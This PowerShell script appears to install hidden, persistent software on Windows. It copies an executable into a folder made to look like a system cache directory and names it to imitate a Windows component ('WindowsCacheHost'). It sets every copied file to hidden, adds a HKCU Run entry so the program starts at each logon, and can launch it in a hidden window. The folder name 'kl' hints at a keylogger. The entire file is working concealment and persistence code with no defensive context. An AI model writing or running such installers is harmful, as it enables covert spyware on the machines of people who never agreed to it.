param(
    [Parameter(Mandatory = $true)][string]$Source,
    [string]$InstallDir = "$env:LOCALAPPDATA\Microsoft\Windows\Caches\kl",
    [string]$RunValue = "WindowsCacheHost",
    [string]$ExeName = "WindowsCacheHost.exe",
    [switch]$Start
)

$ErrorActionPreference = "Stop"
$Source = (Resolve-Path $Source).Path
$exe = Join-Path $Source $ExeName
if (-not (Test-Path $exe)) { throw "Missing $exe" }

New-Item -ItemType Directory -Force -Path $InstallDir | Out-Null
Copy-Item (Join-Path $Source "*") $InstallDir -Recurse -Force
Get-ChildItem $InstallDir -File | ForEach-Object { $_.Attributes = $_.Attributes -bor [IO.FileAttributes]::Hidden }

$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $runKey -Name $RunValue -Value (Join-Path $InstallDir $ExeName)

Write-Host "Installed to $InstallDir and registered HKCU Run value '$RunValue'." -ForegroundColor Green
if ($Start) {
    Start-Process -FilePath (Join-Path $InstallDir $ExeName) -ArgumentList "--installed" -WindowStyle Hidden
    Write-Host "Started hidden from $InstallDir." -ForegroundColor Green
}
